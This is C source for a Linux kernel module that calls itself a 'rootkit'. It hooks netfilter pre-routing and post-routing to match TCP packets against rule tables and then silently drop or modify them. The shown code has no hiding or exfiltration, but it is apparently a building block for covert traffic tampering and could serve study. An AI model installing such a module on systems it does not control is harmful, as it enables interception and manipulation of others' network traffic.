#include "packet_modifier.h"

struct nf_hook_params pre_routing_params = {
    .rules = pre_routing_rules,
    .rule_count = ARRAY_SIZE(pre_routing_rules)
};

struct nf_hook_params post_routing_params = {
    .rules = post_routing_rules,
    .rule_count = ARRAY_SIZE(post_routing_rules)
};

bool is_match(struct packet *packet, struct rule *rule) {
    if ((!rule->filter.src.ip || rule->filter.src.ip == packet->ip_header->saddr) &&
        (!rule->filter.dst.ip || rule->filter.dst.ip == packet->ip_header->daddr))
    {
        switch (packet->ip_header->protocol)
        {
            case IPPROTO_TCP:
                if ((!rule->filter.src.port || rule->filter.src.port == packet->layer4.tcp_header->source) &&
                    (!rule->filter.dst.port || rule->filter.dst.port == packet->layer4.tcp_header->dest)) 
                {
                    return true;
                }
                break;
            default:
                break;
        }
    }
    return false;
}

struct rule *get_matching_rule(struct packet *packet, struct rule* rules, int rule_count) {
    unsigned int rule_index;
    for (rule_index = 0; rule_index < rule_count; rule_index++) {
        struct rule *rule = &rules[rule_index];
        if (is_match(packet, rule)) {
            return rule;
        }
    }
    return NULL;
}

int handle_packet(struct packet *packet, struct rule *matched_rule) {
    switch (matched_rule->action.action_type)
    {
        case DROP:
            printk(KERN_INFO "Dropping packet destined for \n");
            return NF_DROP;
        case MODIFY:
            printk(KERN_INFO "Changing packet destined for \n");
            modify_packet(packet, matched_rule);
            break;
        default:
            break;
    }
    return NF_ACCEPT;
}

unsigned int packet_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct nf_hook_params *params = (struct nf_hook_params *)priv;
    struct packet packet = to_packet(skb);
    struct rule *matched_rule;

    if (packet.ip_header) {
        matched_rule = get_matching_rule(&packet, params->rules, params->rule_count);
        if (matched_rule) {
            print_packet(&packet);
            return handle_packet(&packet, matched_rule);
        }
    }

    return NF_ACCEPT;
}

static struct nf_hook_ops nf_ops[] = {
    {
        .hook = packet_hook,
        .pf = NFPROTO_IPV4,
        .hooknum = NF_INET_PRE_ROUTING,
        .priority = NF_IP_PRI_NAT_DST,
        .priv = &pre_routing_params
    },
    {
        .hook = packet_hook,
        .pf = NFPROTO_IPV4,
        .hooknum = NF_INET_POST_ROUTING,
        .priority = NF_IP_PRI_NAT_SRC,
        .priv = &post_routing_params
    }
};

static int __init rootkit_init(void)
{
    print_rules(pre_routing_rules, ARRAY_SIZE(pre_routing_rules));
    print_rules(post_routing_rules, ARRAY_SIZE(post_routing_rules));
    nf_register_net_hooks(&init_net, nf_ops, ARRAY_SIZE(nf_ops));

    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    nf_unregister_net_hooks(&init_net, nf_ops, ARRAY_SIZE(nf_ops));

    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);